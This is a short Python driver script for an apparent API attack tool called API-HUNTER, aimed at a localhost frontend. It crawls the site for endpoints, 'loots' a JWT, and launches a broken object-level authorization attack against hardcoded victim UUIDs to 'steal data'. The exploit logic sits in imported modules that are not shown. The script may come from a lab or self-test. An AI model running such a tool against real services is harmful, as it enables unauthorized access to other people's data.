# scanner.py
from modules.crawler import discover_endpoints
from modules.bola_engine import run_bola_attack

# Target Application
FRONTEND_URL = "http://localhost:5173"

# Hardcoded victims we want to steal data from
# (In a real scenario, hackers scrape these from forums, metadata, or previous leaks)
VICTIM_TARGETS = [
    "u-7a2e6b19-5d88-4c9f-a3b1-9e4f2c6d8a10",  # Victim User UUID
    "d-a8c3e912-1f44-47d2-b8c1-7d3e9f2056ab"   # Victim Dealer UUID
]

def main():
    print("=== API-HUNTER INITIALIZED ===")
    
    # PHASE 1: Crawl and Loot
    print("\n[PHASE 1] Crawling Frontend & Looting Credentials...")
    discovered_endpoints, looted_data = discover_endpoints(FRONTEND_URL)
    
    print(f"\n[*] Total Endpoints Discovered: {len(discovered_endpoints)}")
    for ep in discovered_endpoints:
        print(f"    - {ep}")

    # PHASE 2: BOLA Attack
    if looted_data.get("token"):
        attack_results = run_bola_attack(discovered_endpoints, looted_data, VICTIM_TARGETS)
    else:
        print("\n[X] Aborting Phase 2: No valid JWT looted during Phase 1.")

    print("\n=== SCAN COMPLETE ===")

if __name__ == "__main__":
    main()